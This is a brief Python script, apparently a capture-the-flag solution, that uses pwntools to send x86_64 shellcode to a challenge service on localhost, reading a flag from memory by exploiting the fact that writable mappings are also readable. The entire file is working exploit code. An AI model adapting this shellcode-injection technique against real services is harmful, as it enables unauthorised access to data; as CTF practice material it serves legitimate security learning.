#!/usr/bin/env python3

# at least on x86_64 there is no such thing as write only mapping:
# PROT_WRITE implies PROT_READ, it's possible to just read the flag

from pwn import *

context.update(arch='x86_64')

target = remote('127.0.0.1', 1337)

shellcode = asm(
'''
    mov rdi, 1; // fd=stdout
    mov rsi, rax; // buf=rax (where the flag is)
    mov rdx, 0x80; // count=0x80
    mov rax, 1; // write(stdout, flag, 0x80)
    syscall;
    mov rax, 60; // exit(whatever)
    syscall;
'''
)

target.send(shellcode)

target.interactive()
